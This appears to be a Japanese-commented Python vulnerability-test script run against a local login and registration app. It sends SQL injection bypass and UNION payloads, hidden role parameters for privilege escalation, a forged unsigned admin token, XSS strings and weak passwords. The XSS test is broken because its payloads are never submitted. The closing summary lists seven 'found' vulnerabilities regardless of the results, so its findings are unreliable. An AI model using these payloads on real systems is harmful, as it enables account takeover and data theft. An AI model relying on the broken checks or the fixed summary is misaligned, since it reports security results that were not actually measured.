#!/usr/bin/env python3
"""
ログイン・新規登録画面の脆弱性テスト
"""

import requests
import json
import base64
from urllib.parse import quote

def test_login_vulnerabilities():
    print("=== ログイン・新規登録の脆弱性テスト ===\n")
    
    base_url = "http://localhost:5000"
    
    # 1. SQLインジェクション脆弱性テスト（ログイン）
    print("1. 🚨 SQLインジェクション脆弱性テスト（ログイン）")
    
    sql_payloads = [
        # 認証バイパス
        ("admin' --", "anything"),
        ("admin' OR '1'='1' --", "anything"),
        ("' OR 1=1 --", "anything"),
        
        # UNION-based SQLi
        ("admin' UNION SELECT 1,1,1,1,1,1,1 --", "anything"),
        ("' UNION SELECT null,username,password,null,null,null,null FROM users --", "anything"),
        
        # Boolean-based SQLi
        ("admin' AND 1=1 --", "anything"),
        ("admin' AND 1=2 --", "anything"),
    ]
    
    session = requests.Session()
    
    for username, password in sql_payloads:
        print(f"テスト: username='{username}', password='{password}'")
        
        response = session.post(f"{base_url}/login", data={
            'username': username,
            'password': password
        })
        
        if response.status_code == 200:
            if "ログインしました" in response.text or "ダッシュボード" in response.text:
                print(f"✅ SQLインジェクション成功: {username}")
            elif "ユーザー名またはパスワードが正しくありません" in response.text:
                print(f"❌ SQLインジェクション失敗: {username}")
            else:
                print(f"⚠️  予期しないレスポンス: {username}")
    
    # 2. 隠しパラメータによる権限昇格テスト
    print("\n2. 🚨 隠しパラメータによる権限昇格テスト")
    
    # 正常なユーザーでログイン + 隠しroleパラメータ
    privilege_payloads = [
        ('admin', 'admin権限に昇格'),
        ('super_admin', 'スーパー管理者権限に昇格'),
        ('moderator', 'モデレーター権限に昇格'),
        ('root', 'root権限に昇格（存在しない権限）'),
    ]
    
    for role, description in privilege_payloads:
        print(f"テスト: role='{role}' ({description})")
        
        # 既存ユーザーでログイン + 隠しroleパラメータ
        response = session.post(f"{base_url}/login", data={
            'username': 'test1001',  # 既存の通常ユーザー
            'password': 'password123',
            'role': role  # 隠しパラメータ
        })
        
        if response.status_code == 302:  # リダイレクト = ログイン成功
            # Cookieを確認
            cookies = dict(response.cookies)
            print(f"設定されたCookie: {cookies}")
            
            if 'is_admin' in cookies and cookies['is_admin'] != 'False':
                print(f"🚨 権限昇格成功: is_admin={cookies['is_admin']}")
            
            if 'role' in cookies:
                print(f"🚨 役割設定成功: role={cookies['role']}")
    
    # 3. 脆弱なJWT風トークンテスト
    print("\n3. 🚨 脆弱なJWT風トークン解析")
    
    # ログイン後のauth_tokenを取得
    response = session.post(f"{base_url}/login", data={
        'username': 'test1001',
        'password': 'password123'
    })
    
    auth_token = session.cookies.get('auth_token')
    if auth_token:
        print(f"取得したauth_token: {auth_token}")
        
        # Base64デコード
        try:
            decoded = base64.b64decode(auth_token).decode()
            token_data = json.loads(decoded)
            print(f"デコードされたトークンデータ: {token_data}")
            print("🚨 トークンが単純なBase64エンコードで、署名なし！")
            
            # トークン改ざんテスト
            malicious_token_data = {
                'user_id': 1,
                'username': 'admin',
                'is_admin': True,
                'role': 'admin'
            }
            
            malicious_token = base64.b64encode(json.dumps(malicious_token_data).encode()).decode()
            print(f"改ざんされたトークン: {malicious_token}")
            
        except Exception as e:
            print(f"トークンデコードエラー: {e}")
    
    # 4. 新規登録のXSS脆弱性テスト
    print("\n4. 🚨 新規登録のXSS脆弱性テスト")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
    ]
    
    for i, payload in enumerate(xss_payloads):
        test_username = f"xsstest{i}"
        print(f"テスト: XSSペイロード='{payload}'")
        
        response = session.post(f"{base_url}/register", data={
            'username': test_username,
            'email': f"{test_username}@test.com",
            'password': 'password123'
        })
        
        if "ユーザー登録が完了しました" in response.text:
            print(f"✅ 登録成功: {test_username}")
            
            # ログイン試行してXSSが発火するか確認
            login_response = session.post(f"{base_url}/login", data={
                'username': test_username,
                'password': 'password123'
            })
            
            if payload in login_response.text and "<script>" in login_response.text:
                print(f"🚨 XSS脆弱性確認: ペイロードがエスケープされずに表示")
    
    # 5. CSRF脆弱性テスト
    print("\n5. 🚨 CSRF脆弱性テスト")
    
    # ログインフォームにCSRFトークンがあるかチェック
    login_page = session.get(f"{base_url}/login")
    if 'csrf' not in login_page.text.lower() and 'token' not in login_page.text.lower():
        print("🚨 CSRFトークンが見つかりません - CSRF攻撃が可能")
    
    # 新規登録フォームにCSRFトークンがあるかチェック
    register_page = session.get(f"{base_url}/register")
    if 'csrf' not in register_page.text.lower() and 'token' not in register_page.text.lower():
        print("🚨 新規登録フォームにCSRFトークンが見つかりません - CSRF攻撃が可能")
    
    # 6. パスワード強度チェック
    print("\n6. 🚨 パスワード強度チェック")
    
    weak_passwords = ["123", "a", "password", "admin", "test"]
    
    for weak_pass in weak_passwords:
        response = session.post(f"{base_url}/register", data={
            'username': f"weakpass_{weak_pass}",
            'email': f"weak_{weak_pass}@test.com",
            'password': weak_pass
        })
        
        if "ユーザー登録が完了しました" in response.text:
            print(f"🚨 弱いパスワード受け入れ: '{weak_pass}'")
    
    print("\n=== 脆弱性サマリー ===")
    print("🚨 発見された主要な脆弱性:")
    print("1. SQLインジェクション（認証バイパス可能）")
    print("2. 隠しパラメータによる権限昇格")
    print("3. 脆弱なJWT風トークン（署名なし）")
    print("4. XSS脆弱性（ユーザー名・メール）")
    print("5. CSRF脆弱性（トークンなし）")
    print("6. パスワード強度検証なし")
    print("7. 脆弱なCookie設定")

if __name__ == "__main__":
    test_login_vulnerabilities()